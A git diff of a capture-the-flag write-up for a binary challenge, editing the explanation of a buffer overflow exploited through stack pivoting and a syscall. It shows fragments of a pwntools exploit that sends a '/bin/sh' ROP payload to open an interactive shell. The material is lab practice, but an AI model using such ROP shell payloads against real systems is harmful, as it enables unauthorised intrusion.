@@ -171,11 +171,11 @@ __int64 __fastcall prison(__int64 a1, int a2, int a3, int a4, int a5, int a6)
 ```
 
 Since it doesn't check `v20`, it has `oob` vuln, but anyway I didn't use this vuln.
-It also has `bof` vuln. I can use various gadget, so I exploit it with `stack pivoting`.
+It also has `bof` vuln. I can use various gadget, so I exploit it with `stack pivoting` and `syscall`.
 
 # exploit
 
-```
+```python
 from pwn import *
 from time import *
 
@@ -209,3 +209,7 @@ payload = b'/bin/sh\x00' + p64(pop_rdi) + p64(bss + 0x100) + p64(pop_rsi_rbp) + 
 p.send(payload)
 p.interactive()
 ```
+
+---
+# squ1rrel-casino
+
